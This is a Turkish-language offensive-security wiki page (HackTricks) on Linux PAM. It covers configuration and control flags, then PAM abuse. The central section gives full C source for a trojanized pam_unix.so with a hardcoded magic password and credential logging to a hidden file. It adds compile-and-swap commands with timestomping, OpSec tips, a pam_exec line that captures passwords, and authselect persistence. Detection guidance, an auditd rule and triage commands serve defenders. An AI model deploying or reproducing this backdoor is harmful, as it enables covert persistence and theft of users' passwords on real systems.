# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Pluggable Authentication Modules)**, **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliğini doğrulayan** ve çeşitli ölçütlere göre erişimlerini kontrol eden bir güvenlik mekanizmasıdır. Dijital bir kapı görevlisi gibi çalışır; yalnızca yetkili kullanıcıların belirli hizmetleri kullanabilmesini sağlarken sistemin aşırı yüklenmesini önlemek için kullanımlarını da sınırlayabilir.

#### Yapılandırma Dosyaları

- **Solaris**, eski merkezi `/etc/pam.conf` dosyasını destekler; ancak güncel yönergeler, `/etc/pam.d` altındaki hizmet dosyalarının kullanılmasını tercih eder.<sup>[[10]](#references)</sup>
- **Linux sistemleri**, dizin tabanlı yaklaşımı tercih eder ve hizmete özgü yapılandırmaları `/etc/pam.d` içinde tutar. Örneğin, login hizmetinin yapılandırma dosyası `/etc/pam.d/login` konumundadır.<sup>[[1]](#references)</sup>

Login hizmeti için bir PAM yapılandırması şöyle görünebilir:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Yönetim Alanları**

Bu alanlar veya yönetim grupları **auth**, **account**, **password** ve **session** öğelerini içerir; her biri kimlik doğrulama ve oturum yönetimi sürecinin farklı yönlerinden sorumludur:<sup>[[1]](#references)</sup>

- **Auth**: Kullanıcı kimliğini doğrular; genellikle parola ister.
- **Account**: Grup üyeliği veya günün saati kısıtlamaları gibi koşulları denetleyerek hesap doğrulamasını yönetir.
- **Password**: Karmaşıklık denetimleri veya sözlük saldırılarını önleme dahil parola güncellemelerini yönetir.
- **Session**: Dizinleri bağlama veya kaynak sınırlarını belirleme gibi, bir hizmet oturumu başlarken ya da sona ererken yapılan işlemleri yönetir.

#### **PAM Modülü Kontrolleri**

Kontroller, modülün başarıya veya başarısızlığa vereceği tepkiyi belirleyerek genel kimlik doğrulama sürecini etkiler. Bunlar şunlardır:<sup>[[1]](#references)</sup>

- **Required**: Gerekli bir modülün başarısız olması sonunda başarısızlıkla sonuçlanır; ancak bundan önce sonraki tüm modüller denetlenir.
- **Requisite**: Başarısızlık durumunda süreç hemen sonlandırılır.
- **Sufficient**: Daha önce hiçbir `required` modül başarısız olmadıysa başarı hemen döndürülür ve aynı yönetim grubundaki kalan modüller atlanır.
- **Optional**: Yalnızca yığındaki tek modülse başarısızlığa neden olur.

#### Önem Taşıyan Saldırı Semantiği

PAM'i analiz ederken veya değiştirirken, **eklenen bir kuralın konumu** hangi yığının bu kuralı göreceğini belirler:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` ve `substack` kuralları başka dosyalardan alır. Bu nedenle `sshd` dosyasını düzenlemek yalnızca SSH'yi etkileyebilirken `system-auth`, `common-auth` veya başka bir paylaşılan yığını düzenlemek aynı anda birden fazla hizmeti etkileyebilir.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM, `[success=1 default=ignore]` gibi köşeli parantezli kontrolleri de destekler. Bunlar, `pam_unix.so` dosyasını görünür biçimde değiştirmek yerine, özel bir denetim başarılı olduktan sonra **bir veya daha fazla modülü atlamak** için kötüye kullanılabilir.<sup>[[1]](#references)</sup>
- `module-path` **mutlak** (`/usr/lib/security/pam_custom.so`) veya varsayılan PAM modül dizinine göre **göreli** olabilir. Modern Linux sistemlerinde gerçek dizinler genellikle `/lib/security`, `/lib64/security`, `/usr/lib/security` veya `/usr/lib/x86_64-linux-gnu/security` gibi multiarch yollarıdır.<sup>[[1]](#references)[[14]](#references)</sup>

Operatörler için kısa not: yamalamadan önce daima **tam hizmet grafiğini** çıkarın. Örneğin, bazı dağıtımlarda `sshd -> password-auth -> system-auth`, diğerlerinde ise `sshd -> system-remote-login -> system-login -> system-auth` zinciri bulunması, aynı tek satırlık implantın amaçlanandan çok daha geniş bir alana yayılabileceği anlamına gelir.<sup>[[1]](#references)[[13]](#references)</sup>

Özel bir `auth` modülü, hesap parolasından sonra `sudo`'ya etkileşimli bir doğrulama isteği ekleyebilir. Doğrulama isteğini elle incelemeden önce geçerli `/etc/pam.d/sudo` yığınını, dahil edilen politikayı, modül argümanlarını ve başvurulan yerel veri dosyalarının izinlerini inceleyin. Okunabilir bir doğrulama sözcük listesi tek başına parola denetimini atlatmaz veya sudoers yetkisi sağlamaz. Ayrıcalıklı geçiş için yine de doğru hesap kimlik doğrulaması, gerekli her PAM adımının tamamlanması ve root yetkisi verebilen bir sudo kuralı gerekir; gözetimsiz numaralandırma doğrulama isteğini tetiklememelidir.

Eski Ubuntu [`pam_motd` sahiplik açığı (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) için, kullanılan gerçek `libpam-modules` derlemesini ve bir oturum açma hizmetinin etkilenen session modülünü çağırıp çağırmadığını inceleyin. Ubuntu, açığı 9.10 için **1.1.0-2ubuntu1.1** ve 10.04 LTS için **1.1.1-2ubuntu5** sürümlerinde düzeltti; diğer sürümler veya tedarikçi backport'ları ayrıca değerlendirilmelidir. Bildirilen saldırı yolunda, çağıranın kendi `.cache` dizinini bir symlink ile değiştirmesi ve ardından PAM üzerinden oturum açmayı tetiklemesi gerekiyordu; bu, eski modülün korumalı bir hedefin sahipliğini değiştirmesine yol açıyordu. Tek başına bir `.cache` girdisi, `pam_motd.so` satırı veya eski kernel sürümü etkilenme durumunu kanıtlamaz; pasif numaralandırma sırasında dosyaları değiştirmeden veya oturum açmayı başlatmadan home dizini üzerindeki denetimi, etkin modül sürümünü, oturum açma erişilebilirliğini, symlink işlemesini ve hedef izinlerini kontrol edin. Bkz. [Ubuntu'nun güvenlik bildirimi](https://ubuntu.com/security/notices/USN-959-1).

#### Örnek Senaryo

Birden fazla auth modülünün bulunduğu bir kurulumda süreç katı bir sırayı izler. `pam_securetty` modülü oturum açma terminalinin yetkisiz olduğunu belirlerse root oturumları engellenir; ancak modülün "required" durumu nedeniyle tüm modüller yine de işlenir. `pam_env`, kullanıcı deneyimini iyileştirmeye yardımcı olabilecek ortam değişkenlerini ayarlar. `pam_ldap` ve `pam_unix` modülleri kullanıcıyı doğrulamak için birlikte çalışır; `pam_unix` daha önce sağlanmış bir parolayı kullanmayı deneyerek kimlik doğrulama yöntemlerinin verimliliğini ve esnekliğini artırır.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Bir hizmet yığınında `pam_permit`

`pam_permit.so`, PAM denetimleri için başarı döndürür. Daha düşük ayrıcalıklı bir kullanıcı bir hizmetin etkin PAM politikasını değiştirebiliyorsa, bu modülü kimlik doğrulama yığınını kısa devre edecek bir kontrol bayrağıyla eklemek, söz konusu hizmetin parola denetimini kaldırabilir. Hangi hizmetlerin etkilendiğine karar vermeden önce `sudo` için `/etc/pam.d/sudo` dosyasını ve dahil edilen `common-auth` veya `system-auth` dosyalarını inceleyin. PAM kimlik doğrulama atlatması **yeni bir sudoers kuralı vermez**; kullanıcının istenen komutu çalıştırma yetkisi yine de olmalıdır. Tek bir `sufficient pam_permit.so` satırının her zaman başarılı olacağını varsaymak yerine kural sırasını ve daha önceki `required` başarısızlıklarını kontrol edin.

## PAM'e Backdoor Ekleme – `pam_unix.so` Hooking

Değerli Linux ortamlarında kullanılan klasik bir kalıcılık yöntemi, **meşru PAM kütüphanesini trojanlaştırılmış bir yedekle değiştirmektir**. PAM yığınının `pam_unix.so` yüklediği bir host'ta SSH veya konsol kimlik doğrulaması, `pam_sm_authenticate()` giriş noktasını çağırabilir; kötü amaçlı bir yedek kimlik bilgilerini yakalayabilir veya *sihirli* parola atlatması uygulayabilir.<sup>[[2]](#references)[[11]](#references)</sup>

### Derleme Kısa Rehberi
Aşağıdaki taslak, kimlik doğrulama belirtecine erişmek için Linux-PAM'in `pam_sm_authenticate()` hizmet giriş noktasını ve `pam_get_authtok()` işlevini kullanır.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Örnek `pam_unix.so` trojanı</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Derleyip gizlice değiştirin (replacement/timestomp kalıbı Unit 42 tarafından belgelenmiştir). Hem wrapper'da sabit kodlanmış yedekleme yolunu hem de aşağıdaki komutları hedefin gerçek PAM modül dizinine göre ayarlayın:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec İpuçları
1. **Atomik üzerine yazma** – kısmen yazılmış bir authentication module bırakmamak için eksiksiz bir library'yi geçici bir dosyaya yazın ve ardından hedef konuma yeniden adlandırın.
2. Unit 42'nin AuthDoor analizinde `/usr/bin/.dbus.log` gibi bir yol gözlemlenmiştir; bu nedenle bu yol da yararlı bir hunting göstergesidir.<sup>[[2]](#references)</sup>
3. Diğer yönetim işlemlerinin çalışmaya devam etmesi için PAM stack'in beklediği entry point'leri (`pam_sm_authenticate` ve `pam_sm_setcred` gibi) koruyun.<sup>[[11]](#references)[[18]](#references)</sup>

### Tespit
Package integrity kontrollerinde RPM, kurulu dosyaların metadata'sını doğrular; `debsums -s` checksum hatalarını bildirir ve triage bloğundaki `dpkg -S` package sahipliğini sorgular. Audit watch syntax'ı, bir yola yapılan yazma ve attribute değişikliklerini kaydeder.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` dosyasının MD5/SHA256 değerini distro package'ındaki değerle karşılaştırın.
* Manuel hashing yapmadan değiştirilmiş library'leri tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` çalıştırın.
* `/lib/security/` altında herkesin yazabildiği veya sahipliği olağandışı olan dosyaları kontrol edin.
* `auditd` kuralı: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen modüller için PAM config dosyalarında grep yapın: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Bu `pam_` grep'i, farklı `.so` basename'lerine sahip özel modülleri gözden kaçırır. `/etc/pam.d` içindeki (ve kullanılıyorsa `/etc/pam.conf` içindeki) etkin `auth`, `account`, `password` ve `session` satırlarını; bunların control flag'lerini ve dahil edilen stack'leri de inceleyin. Normal password kontrolünden önce `auth sufficient` olarak yerleştirilmiş, tanımadığınız bir modül; package sahipliğinin ve binary'nin incelenmesini gerektirir. [PAM'in control syntax'ı](https://man7.org/linux/man-pages/man5/pam.d.5.html), başarılı bir işlemin stack'in o bölümünü erken sonlandırmasına neden olabilir. Bir modül adı, olağandışı timestamp veya `nodelay` seçeneği tek başına bir bypass olduğunu kanıtlamaz. Davranış bir timing leak'e işaret ediyorsa, önce uygulamayı ve servise erişilebilirliği inceleyin; rutin enumeration sırasında tekrar tekrar authentication tahminleri göndermeyin.

### Hızlı triage komutları (compromise sonrası veya threat hunting için)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Kalıcılık için `pam_exec`'in kötüye kullanılması
`pam_unix.so` dosyasını değiştirmek yerine, daha hafif bir yöntem `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklemektir. Böylece bu PAM satırına ulaşan bir çağrı, normal yığını olduğu gibi bırakırken bir yardımcı programı çalıştırır.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`, `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` ve `PAM_TYPE` gibi ortam değişkenlerinde PAM meta verilerini alır. `expose_authtok` ile yardımcı program, `auth` veya `password` aşamalarında parolanın en fazla `PAM_MAX_RESP_SIZE` baytını `stdin` üzerinden okuyabilir. Yardımcı programın gerçek UID yerine etkin UID ile çalışmasını istiyorsanız `seteuid` ekleyin.<sup>[[4]](#references)</sup>

Aşağıdaki uygulama notları, `pam_exec` için belgelenen modül türlerini ve `type=` filtresini temel alır:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...`, soketleri yeniden açma veya ayrılmış bir daemon başlatma gibi **oturum açma sonrası eylemler** için daha uygundur.
- `auth optional pam_exec.so quiet expose_authtok ...`, oturum açılmadan önce çalıştığı için **kimlik bilgisi yakalama** amacıyla yaygın olarak tercih edilir.
- `type=session` veya `type=auth`, yürütmeyi belirli bir PAM aşamasıyla sınırlandırmak ve gereksiz çift yürütmeyi önlemek için kullanılabilir.

Ayrıcalık incelemesinde, mevcut kullanıcının yazabildiği mutlak bir `pam_exec.so` yardımcı programı yolu, dosya append-only (`a`) olarak işaretlenmiş olsa bile adaydır: [bu öznitelik dosyaya ekleme yapılmasına izin verir](https://man7.org/linux/man-pages/man1/chattr.1.html) ve bu, bir shell script'inin sonraki davranışını değiştirmek için yeterli olabilir. Öncelikle PAM hizmetinin ve olayın gerçekten bu satıra ulaştığını, yardımcı programın ve üst dizin yolunun güvenilir olduğunu ve komutun daha ayrıcalıklı bir kimlikle çalıştığını doğrulayın; [`seteuid`, hangi PAM UID'sinin kullanılacağını değiştirir](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Tek başına yazılabilir bir dosya veya `lsattr` sonucu, ayrıcalıklı yürütmeyi kanıtlamaz.

### Dağıtım araçlarına dayanıklılık: `authselect`

`authselect` kullanan RHEL ve Fedora ailesi sistemlerde, `/etc/pam.d/system-auth` veya `/etc/pam.d/password-auth` gibi oluşturulan dosyalarda doğrudan yapılan düzenlemeler **`authselect` tarafından üzerine yazılabilir**. Kalıcılık için operatörler genellikle etkin özel profili `/etc/authselect/custom/<profile>/` altında yamalar ve ardından yeniden seçer.<sup>[[5]](#references)[[19]](#references)</sup>

Root erişiminiz olduğunda izlenen tipik iş akışı:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Bu, hem saldırı hem de triage açısından önemlidir: `/etc/pam.d/system-auth` dosyasında `Generated by authselect` ve `Do not modify this file manually` banner'ları varsa, gerçek persistence noktası `/etc/pam.d/` yerine `/etc/authselect/custom/` altında bulunabilir.<sup>[[5]](#references)</sup>

### Gerçek dünyada görülen güncel tradecraft

Plague Linux backdoor'u hakkında 2025'te yayımlanan güncel raporlar, aynı temel fikrin daha ileri taşındığını gösterdi: **statik bir bypass parolası** içeren kötü amaçlı bir PAM bileşeni ve oturum izlerini azaltmak için login sonrasında SSH ile ilgili environment variable'ların ve shell history'nin (`HISTFILE=/dev/null`) temizlenmesi.<sup>[[3]](#references)</sup> Bu, kullanışlı bir hunting pattern'dir; çünkü backdoor mantığı PAM içinde bulunurken stealth izleri yalnızca authentication başarılı **olduktan sonra** ortaya çıkabilir.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Gizli Operatörün Oyun Kitabı: Küresel Telekomünikasyon Ağlarına Sızma - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux için Yeni Keşfedilen PAM Tabanlı Bir Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect kullanarak kullanıcı authentication'ını yapılandırma - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4'te Authentication Yönetimi](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Sistem Düzeyinde Authentication Kılavuzu - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu paket dosyası listesi: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Değişiklikler/Authselect'i Zorunlu Kılma - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
